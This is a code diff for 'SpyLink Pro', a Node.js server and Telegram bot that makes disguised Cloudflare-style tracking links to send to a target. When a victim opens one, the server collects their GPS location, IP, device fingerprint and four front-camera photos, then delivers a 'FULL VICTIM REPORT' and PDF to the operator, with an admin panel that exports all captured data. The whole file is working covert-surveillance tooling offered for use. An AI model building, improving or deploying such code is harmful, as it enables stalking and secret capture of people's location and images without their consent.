@@ -1,11 +1,8 @@
 // server.js
 require('dotenv').config();
-const fs = require("fs");
-const path = require("path");
 const express = require("express");
 const cors = require('cors');
 const bodyParser = require('body-parser');
-const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
 const pdfMake = require('pdfmake');
 const fonts = {
@@ -18,6 +15,7 @@ const fonts = {
 };
 const printer = new pdfMake(fonts);
 const { v4: uuidv4 } = require('uuid');
+const path = require('path');
 
 const app = express();
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
@@ -26,6 +24,7 @@ const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 app.use(require('helmet')());
 app.use(require('compression')());
 app.use(require('morgan')('combined'));
+app.use(require('response-time')());
 
 // Middlewares
 app.use(cors({ origin: '*' }));
@@ -34,72 +33,44 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.set("view engine", "ejs");
 app.use(express.static("public"));
 
-// Host URL
+// In-Memory "Database"
+let sessions = {}; // { sessionId: { chatId, url, data, location, images[], createdAt, completedAt } }
+let adminAccessList = {}; // { chatId: true }
+
 const hostURL = process.env.HOST_URL || "https://yourdomain.com";
-const useShortener = false;
 
-// In-memory storage (replace with DB in production)
-let sessions = {};
-let adminPanelAccess = {}; // { chatId: true }
-
-// ==================== ROUTES ====================
-
-app.get("/w/:path/:uri", (req, res) => {
-  const ip = getIP(req);
-  const time = getTime();
-  if (req.params.path) {
-    res.render("webview", { ip, time, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: useShortener });
-  } else {
-    res.redirect("https://t.me/aadi_io");
-  }
-});
-
-app.get("/c/:path/:uri", (req, res) => {
-  const ip = getIP(req);
-  const time = getTime();
-  if (req.params.path) {
-    res.render("cloudflare", { ip, time, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: useShortener });
-  } else {
-    res.redirect("https://t.me/aadi_io");
-  }
-});
-
-app.get("/", (req, res) => {
-  res.json({ ip: getIP(req), status: "OK", version: "2.0" });
-});
-
-// ==================== TELEGRAM BOT ====================
+// ==================== TELEGRAM BOT HANDLERS ====================
 
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text?.trim();
 
-  // Admin Panel Access
-  if (text === "/admin" && chatId == process.env.ADMIN_ID) {
-    adminPanelAccess[chatId] = true;
-    return bot.sendMessage(chatId, "🔐 Admin Panel Activated. Use /panel", { parse_mode: "Markdown" });
+  // Grant Admin Access
+  if (text === "/admin" && String(chatId) === process.env.ADMIN_CHAT_ID) {
+    adminAccessList[chatId] = true;
+    return bot.sendMessage(chatId, "🔐 *Admin Access Granted*\nUse /panel to open dashboard.", { parse_mode: "Markdown" });
   }
 
-  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
-    return await createLink(chatId, text);
+  // Handle URL reply
+  if (msg?.reply_to_message?.text === "🌐 Please send the target URL (must start with http:// or https://)") {
+    return await handleUrlSubmission(chatId, text);
   }
 
+  // Command Router
   switch (text) {
     case "/start":
-      return sendStartMessage(chatId, msg.chat.first_name);
+      return sendWelcomeMessage(chatId, msg.from.first_name);
     case "/create":
-      return createNew(chatId);
+      return requestTargetUrl(chatId);
     case "/help":
       return sendHelp(chatId);
     case "/panel":
-      if (adminPanelAccess[chatId]) return showAdminPanel(chatId);
-      break;
-    case "/stats":
-      if (adminPanelAccess[chatId]) return sendStats(chatId);
+      if (adminAccessList[chatId]) return showAdminPanel(chatId);
+      else bot.sendMessage(chatId, "⛔ Access Denied. Only admins can use this.");
       break;
     default:
       if (!text) return;
-      bot.sendMessage(chatId, "❓ Unknown command. Type /help");
+      bot.sendMessage(chatId, "❓ Unknown command. Type /help for instructions.");
   }
 });
 
@@ -109,287 +80,382 @@ bot.on('callback_query', async (callbackQuery) => {
 
   await bot.answerCallbackQuery(callbackQuery.id);
 
-  if (data === "crenew") {
-    createNew(chatId);
-  } else if (data === "genpdf") {
-    const sessionId = callbackQuery.message.text.match(/ID:\s*(\S+)/)?.[1];
-    if (sessionId && sessions[sessionId]) {
-      await generateAndSendPDF(chatId, sessionId);
-    } else {
-      bot.sendMessage(chatId, "❌ Session not found.");
-    }
-  } else if (data === "export_all") {
-    if (adminPanelAccess[chatId]) {
-      exportAllData(chatId);
-    }
+  if (data.startsWith("genpdf_")) {
+    const sessionId = data.split("_")[1];
+    await generateAndSendPDF(chatId, sessionId);
+  } else if (data === "view_all_sessions" && adminAccessList[chatId]) {
+    viewAllSessions(chatId);
+  } else if (data === "export_all_data" && adminAccessList[chatId]) {
+    exportAllData(chatId);
+  } else if (data === "clear_all_sessions" && adminAccessList[chatId]) {
+    sessions = {};
+    bot.sendMessage(chatId, "🗑️ All sessions cleared.");
+  } else if (data === "create_new_link") {
+    requestTargetUrl(chatId);
   }
 });
 
-bot.on('polling_error', (error) => {
-  console.error("Polling error:", error.code, error.message);
-});
-
-// ==================== DATA ENDPOINTS ====================
+// ==================== DATA COLLECTION ENDPOINTS ====================
 
 app.post("/location", async (req, res) => {
-  const { lat, lon, uid, acc } = req.body;
-  if (lat && lon && uid && acc) {
-    const userId = parseInt(uid, 36);
-    const sessionId = sessions[uid]?.id;
-    if (sessionId) {
-      sessions[sessionId].location = { lat, lon, accuracy: acc };
-      await bot.sendLocation(userId, parseFloat(lat), parseFloat(lon));
-      await bot.sendMessage(userId, `📍 Location Captured\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}m`, { reply_markup: { inline_keyboard: [[{ text: "📄 Generate Full Report (PDF)", callback_data: "genpdf" }]] } });
-    }
-    res.send("Done");
+  const { uid, lat, lon, acc } = req.body;
+  const sessionId = uid; // We now use UUID as session ID directly
+
+  if (lat && lon && sessionId && sessions[sessionId]) {
+    sessions[sessionId].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(acc) };
+    checkSessionCompletion(sessionId);
+    res.send("Location received");
   } else {
-    res.status(400).send("Invalid data");
+    res.status(400).send("Invalid or missing data");
   }
 });
 
 app.post("/camsnap", async (req, res) => {
   const { uid, img } = req.body;
-  if (uid && img) {
-    const buffer = Buffer.from(img, 'base64');
-    const sessionId = sessions[uid]?.id;
-    if (sessionId) {
-      if (!sessions[sessionId].images) sessions[sessionId].images = [];
-      sessions[sessionId].images.push(buffer.toString('base64'));
+  const sessionId = uid;
+
+  if (img && sessionId && sessions[sessionId]) {
+    if (!sessions[sessionId].images) sessions[sessionId].images = [];
+    if (sessions[sessionId].images.length < 4) {
+      sessions[sessionId].images.push(img); // store base64 string
+      checkSessionCompletion(sessionId);
     }
-    await bot.sendPhoto(parseInt(uid, 36), buffer, {}, { caption: "📸 Camera Snapshot Captured" });
-    res.send("Done");
+    res.send("Image received");
   } else {
-    res.status(400).send("Invalid image data");
+    res.status(400).send("Invalid image or session");
   }
 });
 
-app.post("/", async (req, res) => {
+app.post("/data", async (req, res) => {
   const { uid, data } = req.body;
-  const ip = getIP(req);
-  if (uid && data) {
-    const userId = parseInt(uid, 36);
-    const sessionId = uuidv4();
-    sessions[uid] = { id: sessionId, data: decodeURIComponent(data), ip, timestamp: new Date(), images: [] };
+  const sessionId = uid;
 
-    // Send formatted message
-    let cleanData = decodeURIComponent(data).replaceAll("<br>", "\n").replaceAll("<b>", "*").replaceAll("</b>", "*").replaceAll("<code>", "`").replaceAll("</code>", "`");
-    await bot.sendMessage(userId, `📱 *Device Report Received*\nSession ID: \`${sessionId}\`\n\n${cleanData}`, {
-      parse_mode: "Markdown",
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "📷 View Snapshots", callback_data: "view_snaps_" + sessionId }],
-          [{ text: "📄 Generate PDF Report", callback_data: "genpdf" }]
-        ]
-      }
-    });
-
-    // Auto-generate PDF after 10 seconds if no interaction
-    setTimeout(() => {
-      if (sessions[sessionId]) {
-        generateAndSendPDF(userId, sessionId);
-      }
-    }, 10000);
-
-    res.send("Done");
+  if (data && sessionId) {
+    if (!sessions[sessionId]) {
+      // Initialize session if not exists
+      sessions[sessionId] = {
+        chatId: parseInt(sessionId, 36), // backward compatibility fallback
+        data: decodeURIComponent(data),
+        images: [],
+        createdAt: new Date(),
+        ip: getIP(req)
+      };
+    } else {
+      sessions[sessionId].data = decodeURIComponent(data);
+    }
+    checkSessionCompletion(sessionId);
+    res.send("Data received");
   } else {
-    res.send("ok");
+    res.status(400).send("Invalid payload");
   }
 });
 
-// ==================== UTILITY FUNCTIONS ====================
+// ==================== SESSION COMPLETION CHECKER ====================
 
-function getIP(req) {
-  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-         req.connection?.remoteAddress ||
-         req.socket?.remoteAddress ||
-         req.ip;
-}
+function checkSessionCompletion(sessionId) {
+  const session = sessions[sessionId];
+  if (!session || session.completed) return;
 
-function getTime() {
-  return new Date().toISOString().replace('T', ' ').substring(0, 19);
-}
+  const hasData = !!session.data;
+  const hasLocation = !!session.location;
+  const hasFourImages = session.images && session.images.length >= 4;
 
-async function createLink(cid, url) {
-  if (!url || !/^https?:\/\//i.test(url)) {
-    return bot.sendMessage(cid, "⚠️ Invalid URL. Must start with http:// or https://");
+  if (hasData && hasLocation && hasFourImages) {
+    session.completed = true;
+    session.completedAt = new Date();
+    setTimeout(() => deliverReport(sessionId), 1000); // slight delay for stability
   }
+}
+
+async function deliverReport(sessionId) {
+  const session = sessions[sessionId];
+  if (!session || !session.completed) return;
+
+  const chatId = session.chatId;
 
   try {
-    const encodedUrl = btoa(encodeURIComponent(url));
-    const path = cid.toString(36);
-    const fullUrl = `${path}/${encodedUrl}`;
-    let cUrl = `${hostURL}/c/${fullUrl}`;
-    let wUrl = `${hostURL}/w/${fullUrl}`;
+    // Format Data for Telegram
+    let formattedData = session.data
+      .replaceAll("<br>", "\n")
+      .replaceAll("<b>", "*")
+      .replaceAll("</b>", "*")
+      .replaceAll("<code>", "`")
+      .replaceAll("</code>", "`")
+      .replaceAll("&nbsp;", " ");
 
-    if (useShortener) {
-      const [x, y] = await Promise.all([
-        shortenUrl(cUrl),
-        shortenUrl(wUrl)
-      ]);
-      cUrl = x; wUrl = y;
+    let message = `
+✅ *FULL VICTIM REPORT RECEIVED*
+
+📊 *Session ID:* \`${sessionId}\`
+🌐 *Original URL:* ${session.url || 'N/A'}
+📍 *Location:* https://www.google.com/maps?q=${session.location.lat},${session.location.lon}
+📅 *Captured At:* ${session.completedAt.toLocaleString()}
+
+📄 *DEVICE & BROWSER DATA:*
+${formattedData}
+
+📷 *Captured 4 camera snapshots.*
+`;
+
+    // Send all camera images first
+    for (let img of session.images) {
+      const buffer = Buffer.from(img, 'base64');
+      await bot.sendPhoto(chatId, buffer, { caption: "📸 Camera Snapshot" });
     }
 
-    const message = `
-✅ *Tracking Links Generated*
-
-🔗 *Original URL:* ${url}
-
-🌐 *Cloudflare Page:*
-${cUrl}
-
-📱 *WebView Page:*
-${wUrl}
-
-⏱️ Data will auto-send when victim opens link.
-📊 Full PDF report generated after data collection.
-
-👇 *Options:*
-`;
-    await bot.sendMessage(cid, message, {
+    // Send consolidated message
+    await bot.sendMessage(chatId, message, {
       parse_mode: "Markdown",
       reply_markup: {
         inline_keyboard: [
-          [{ text: "🆕 Create New Link", callback_data: "crenew" }],
-          [{ text: "📂 View All Sessions", callback_data: "view_sessions" }]
+          [{ text: "📥 Download Full PDF Report", callback_data: `genpdf_${sessionId}` }],
+          [{ text: "🆕 Create New Link", callback_data: "create_new_link" }]
         ]
       }
     });
-  } catch (e) {
-    console.error(e);
-    bot.sendMessage(cid, "❌ Error generating links. Try again.");
+
+    // Auto-generate and send PDF after 3 seconds
+    setTimeout(() => generateAndSendPDF(chatId, sessionId), 3000);
+
+  } catch (error) {
+    console.error("Error delivering report:", error);
+    bot.sendMessage(chatId, "❌ Error sending full report. Admin notified.");
   }
 }
 
-async function shortenUrl(longUrl) {
-  try {
-    const res = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(longUrl)}`);
-    const json = await res.json();
-    return Object.values(json)[0] || longUrl;
-  } catch {
-    return longUrl;
-  }
-}
-
-function createNew(cid) {
-  bot.sendMessage(cid, "🌐 *Enter the target URL (must include http:// or https://)*", {
-    parse_mode: "Markdown",
-    reply_markup: { force_reply: true }
-  });
-}
+// ==================== PDF GENERATOR ====================
 
 async function generateAndSendPDF(chatId, sessionId) {
   const session = sessions[sessionId];
   if (!session) return bot.sendMessage(chatId, "❌ Session expired or not found.");
 
-  const docDefinition = {
-    content: [
-      { text: '🕵️ SPYLINK DETAILED REPORT', style: 'header' },
-      { text: `Session ID: ${sessionId}`, style: 'subheader' },
-      { text: `Generated: ${new Date().toLocaleString()}`, style: 'subheader' },
-      { text: '\n\n' },
-      { text: '📡 VICTIM INFORMATION', style: 'section' },
-      { text: session.data.replace(/<[^>]*>?/gm, '').replace(/&nbsp;/g, ' ') },
-      { text: '\n\n' },
-      ...(session.location ? [
+  try {
+    const docDefinition = {
+      pageSize: 'A4',
+      pageMargins: [40, 60, 40, 60],
+      header: {
+        columns: [
+          { text: '🕵️ SPYLINK PRO REPORT', style: 'header', alignment: 'center' }
+        ],
+        margin: [0, 20, 0, 20]
+      },
+      footer: (currentPage, pageCount) => {
+        return {
+          text: `Page ${currentPage} of ${pageCount} • Generated on ${new Date().toLocaleString()}`,
+          alignment: 'center',
+          fontSize: 9,
+          margin: [0, 10, 0, 0]
+        };
+      },
+      content: [
+        { text: `Session ID: ${sessionId}`, style: 'subheader' },
+        { text: `Victim IP: ${session.ip || 'Unknown'}`, style: 'subheader' },
+        { text: `Timestamp: ${session.completedAt.toLocaleString()}`, style: 'subheader' },
+        { text: `Target URL: ${session.url || 'N/A'}`, style: 'subheader' },
+        { text: '\n\n' },
+
         { text: '📍 LOCATION DATA', style: 'section' },
         `Latitude: ${session.location.lat}`,
         `Longitude: ${session.location.lon}`,
         `Accuracy: ${session.location.accuracy} meters`,
-        { text: '\n\n' }
-      ] : []),
-      ...(session.images?.length > 0 ? [
-        { text: '📸 CAMERA SNAPSHOTS', style: 'section' },
-        ...session.images.map(img => ({ image: `data:image/png;base64,${img}`, width: 400 })),
-        { text: '\n\n' }
-      ] : [])
-    ],
-    styles: {
-      header: { fontSize: 22, bold: true, margin: [0, 0, 0, 10] },
-      subheader: { fontSize: 14, italic: true, margin: [0, 0, 0, 5] },
-      section: { fontSize: 18, bold: true, margin: [0, 10, 0, 5] }
-    }
-  };
+        `Google Maps: https://www.google.com/maps?q=${session.location.lat},${session.location.lon}`,
+        { text: '\n\n' },
 
-  const pdfDoc = printer.createPdfKitDocument(docDefinition);
-  const chunks = [];
-  pdfDoc.on('data', chunk => chunks.push(chunk));
-  pdfDoc.on('end', async () => {
-    const result = Buffer.concat(chunks);
-    await bot.sendDocument(chatId, result, {}, { caption: "📄 Full Spy Report (PDF)", filename: `spy_report_${sessionId}.pdf` });
-    delete sessions[sessionId]; // Cleanup
-  });
-  pdfDoc.end();
+        { text: '📱 DEVICE & BROWSER FINGERPRINT', style: 'section' },
+        ...session.data
+          .replace(/<[^>]*>?/gm, '')
+          .split('<br>')
+          .filter(line => line.trim())
+          .map(line => ({ text: line, margin: [0, 0, 0, 2] })),
+        { text: '\n\n' },
+
+        { text: '📸 CAMERA SNAPSHOTS', style: 'section' },
+        ...session.images.map(img => ({
+          image: `data:image/png;base64,${img}`,
+          width: 400,
+          margin: [0, 10, 0, 10]
+        }))
+      ],
+      styles: {
+        header: { fontSize: 20, bold: true, color: '#2c3e50' },
+        subheader: { fontSize: 12, italic: true, margin: [0, 5, 0, 10] },
+        section: { fontSize: 16, bold: true, color: '#e74c3c', margin: [0, 15, 0, 5] }
+      }
+    };
+
+    const pdfDoc = printer.createPdfKitDocument(docDefinition);
+    const chunks = [];
+    pdfDoc.on('data', chunk => chunks.push(chunk));
+    pdfDoc.on('end', async () => {
+      const result = Buffer.concat(chunks);
+      await bot.sendDocument(chatId, result, {}, {
+        caption: `📄 SpyLink Pro Report\nSession: ${sessionId}`,
+        filename: `spylink_report_${sessionId}.pdf`
+      });
+    });
+    pdfDoc.end();
+
+  } catch (error) {
+    console.error("PDF Generation Error:", error);
+    bot.sendMessage(chatId, "❌ Failed to generate PDF. Retry via button.");
+  }
 }
 
 // ==================== ADMIN PANEL ====================
 
-async function showAdminPanel(chatId) {
+function showAdminPanel(chatId) {
   const totalSessions = Object.keys(sessions).length;
-  const activeUsers = new Set(Object.values(sessions).map(s => s.userId)).size;
+  const completedSessions = Object.values(sessions).filter(s => s.completed).length;
 
   let msg = `
-🔐 *ADMIN PANEL*
+🔐 *ADMIN DASHBOARD*
 
-📊 Total Active Sessions: *${totalSessions}*
-👥 Unique Targets: *${activeUsers}*
-⏳ Server Uptime: *${process.uptime().toFixed(0)}s*
+📊 Total Sessions: *${totalSessions}*
+✅ Completed: *${completedSessions}*
+⏳ Pending: *${totalSessions - completedSessions}*
 
 🛠️ *Actions:*
 `;
-  await bot.sendMessage(chatId, msg, {
+  bot.sendMessage(chatId, msg, {
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "📈 View Stats", callback_data: "stats" }],
-        [{ text: "💾 Export All Data", callback_data: "export_all" }],
-        [{ text: "🧹 Clear Sessions", callback_data: "clear_sessions" }]
+        [{ text: "👁️ View All Sessions", callback_data: "view_all_sessions" }],
+        [{ text: "💾 Export All Data (JSON)", callback_data: "export_all_data" }],
+        [{ text: "🗑️ Clear All Sessions", callback_data: "clear_all_sessions" }]
       ]
     }
   });
 }
 
-async function sendStats(chatId) {
-  const stats = {
-    uptime: process.uptime(),
-    memory: process.memoryUsage(),
-    sessions: Object.keys(sessions).length,
-    uniqueTargets: new Set(Object.values(sessions).map(s => s.userId)).size
-  };
-  let msg = `📊 *SERVER STATS*\n\n`;
-  msg += `⏱️ Uptime: ${stats.uptime.toFixed(0)} seconds\n`;
-  msg += `MemoryWarning: ${(stats.memory.heapUsed / 1024 / 1024).toFixed(2)} MB / ${(stats.memory.heapTotal / 1024 / 1024).toFixed(2)} MB\n`;
-  msg += `📁 Active Sessions: ${stats.sessions}\n`;
-  msg += `🎯 Unique Targets: ${stats.uniqueTargets}`;
-  bot.sendMessage(chatId, msg, { parse_mode: "Markdown" });
+function viewAllSessions(chatId) {
+  if (Object.keys(sessions).length === 0) {
+    return bot.sendMessage(chatId, "📭 No sessions recorded yet.");
+  }
+
+  let msg = "*📋 ALL SESSIONS*\n\n";
+  for (let [id, sess] of Object.entries(sessions)) {
+    msg += `📄 *ID:* \`${id}\`\n`;
+    msg += `👤 User: \`${sess.chatId}\`\n`;
+    msg += `✅ Status: ${sess.completed ? 'Completed' : 'Pending'}\n`;
+    msg += `🌐 URL: ${sess.url || 'N/A'}\n`;
+    msg += `🕒 Created: ${new Date(sess.createdAt).toLocaleTimeString()}\n`;
+    msg += `📷 Images: ${sess.images?.length || 0}/4\n`;
+    msg += `${sess.location ? '📍 Location: Captured' : '📍 Location: Pending'}\n`;
+    msg += "---\n";
+  }
+
+  bot.sendMessage(chatId, msg, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]
+      ]
+    }
+  });
 }
 
 function exportAllData(chatId) {
-  const data = JSON.stringify(sessions, null, 2);
-  const buffer = Buffer.from(data);
-  bot.sendDocument(chatId, buffer, {}, { caption: "💾 Full Data Export (JSON)", filename: `export_${Date.now()}.json` });
+  const exportData = {
+    timestamp: new Date().toISOString(),
+    totalSessions: Object.keys(sessions).length,
+    sessions: { ...sessions }
+  };
+
+  // Sanitize binary data for JSON
+  for (let id in exportData.sessions) {
+    if (exportData.sessions[id].images) {
+      exportData.sessions[id].images = exportData.sessions[id].images.map((img, i) => `[Image ${i+1} - Base64 Snippet: ${img.substring(0, 50)}...]`);
+    }
+  }
+
+  const buffer = Buffer.from(JSON.stringify(exportData, null, 2));
+  bot.sendDocument(chatId, buffer, {}, {
+    caption: "💾 Full Data Export (JSON)",
+    filename: `spylink_export_${Date.now()}.json`
+  });
 }
 
-// ==================== UI MESSAGES ====================
+// ==================== UTILITIES ====================
 
-function sendStartMessage(chatId, firstName) {
-  bot.sendMessage(chatId, `🎉 *Welcome ${firstName}!* 
+function getIP(req) {
+  return (
+    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+    req.connection?.remoteAddress ||
+    req.socket?.remoteAddress ||
+    req.ip ||
+    'Unknown'
+  );
+}
 
-I am *SpyLink Bot* — your ultimate digital reconnaissance tool.
+async function handleUrlSubmission(chatId, url) {
+  if (!url || !/^https?:\/\//i.test(url)) {
+    bot.sendMessage(chatId, "⚠️ Invalid URL. Must start with http:// or https://");
+    return requestTargetUrl(chatId);
+  }
 
-✨ *Features:*
+  const sessionId = uuidv4(); // Generate secure UUID
+  sessions[sessionId] = {
+    chatId: chatId,
+    url: url,
+    createdAt: new Date()
+  };
+
+  const encodedUrl = btoa(encodeURIComponent(url));
+  const trackingLink = `${hostURL}/c/${sessionId}/${encodedUrl}`;
+
+  let message = `
+✅ *TRACKING LINK GENERATED*
+
+🔗 *Target URL:* ${url}
+🆔 *Session ID:* \`${sessionId}\`
+
+🌐 *Send this link to your target:*
+${trackingLink}
+
+⏳ *Bot will wait until:*
+• Full device fingerprint
+• GPS location
+• 4 camera snapshots
+→ Then send ONE consolidated report + PDF.
+
+⚠️ Works best on mobile devices with camera & location permissions.
+`;
+
+  bot.sendMessage(chatId, message, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📥 Regenerate PDF Later", callback_data: `genpdf_${sessionId}` }],
+        [{ text: "🆕 Create Another Link", callback_data: "create_new_link" }]
+      ]
+    }
+  });
+}
+
+function requestTargetUrl(chatId) {
+  bot.sendMessage(chatId, "🌐 Please send the target URL (must start with http:// or https://)", {
+    reply_markup: { force_reply: true }
+  });
+}
+
+function sendWelcomeMessage(chatId, firstName) {
+  bot.sendMessage(chatId, `🎯 *Welcome ${firstName} to SpyLink Pro!*
+
+I generate stealthy Cloudflare-style tracking links that silently collect:
+
 📍 Real-time GPS Location
 📱 Full Device/Browser Fingerprint
-🔋 Battery, Network, Sensors
-📷 Front Camera Snapshots (up to 4)
+🔋 Battery, Network, Sensors, Permissions
+📷 4 Front Camera Snapshots
 🖨️ Auto-generated PDF Reports
-🌐 Cloudflare or WebView Cloaking
 
-👇 *Get Started:*
+👇 *Start Now:*
 `, {
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "🚀 Create Tracking Link", callback_data: "crenew" }],
+        [{ text: "🚀 Create Tracking Link", callback_data: "create_new_link" }],
         [{ text: "📘 Help & Instructions", callback_data: "help" }]
       ]
     }
@@ -397,30 +463,58 @@ I am *SpyLink Bot* — your ultimate digital reconnaissance tool.
 }
 
 function sendHelp(chatId) {
-  bot.sendMessage(chatId, `📘 *HOW TO USE*
+  bot.sendMessage(chatId, `📘 *HOW TO USE SPYLINK PRO*
 
-1️⃣ Send /create
-2️⃣ Enter any URL (e.g., https://google.com)
-3️⃣ You’ll receive 2 cloaked tracking links:
-   → Cloudflare-style (looks legit)
-   → WebView (full-screen capture)
+1. Tap /create or “Create Tracking Link”
+2. Send any URL (e.g., https://google.com)
+3. You’ll get a *Cloudflare-looking tracking link*
+4. Send it to your target (works best on mobile)
+5. When opened, victim’s browser will:
+   → Collect device, network, battery, sensor data
+   → Request location permission
+   → Capture 4 front-camera photos (every 2 sec)
+6. ⏳ Bot WAITS until ALL data is collected
+7. You receive ONE detailed message + 4 photos + auto-generated PDF
 
-4️⃣ Send link to target.
-5️⃣ When opened, you’ll instantly receive:
-   → IP, Location, Device Info, Browser Data
-   → 4 Camera snapshots (if permitted)
-   → Auto-generated PDF report
+🔐 Admin? Use /admin then /panel
 
-⚠️ *Note:* Some sites block iframe embedding. Use WebView mode for best results.
-
-👨‍💻 Admin: @aadi_io`, { parse_mode: "Markdown" });
+👨‍💻 Support: @aadi_io`, { parse_mode: "Markdown" });
 }
+
+// ==================== EXPRESS ROUTES ====================
+
+app.get("/c/:sessionId/:encodedUrl", (req, res) => {
+  const { sessionId, encodedUrl } = req.params;
+  const url = decodeURIComponent(atob(encodedUrl));
+
+  if (sessions[sessionId]) {
+    sessions[sessionId].lastAccessed = new Date();
+  }
+
+  res.render("cloudflare", {
+    ip: getIP(req),
+    time: new Date().toISOString().replace('T', ' ').substring(0, 19),
+    url: url,
+    uid: sessionId,
+    a: hostURL,
+    t: false // disable external IP fetch for speed
+  });
+});
+
+app.get("/", (req, res) => {
+  res.json({
+    status: "SpyLink Pro Running",
+    version: "3.0",
+    sessions: Object.keys(sessions).length,
+    uptime: process.uptime()
+  });
+});
 
 // ==================== START SERVER ====================
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`🚀 SpyLink Bot v2.0 Running on Port ${PORT}`);
-  console.log(`🔗 Host URL: ${hostURL}`);
-  console.log(`🤖 Bot Active. Monitoring...`);
+  console.log(`🚀 SpyLink Pro v3.0 | Port: ${PORT}`);
+  console.log(`🔗 Host: ${hostURL}`);
+  console.log(`🤖 Bot is polling...`);
 });
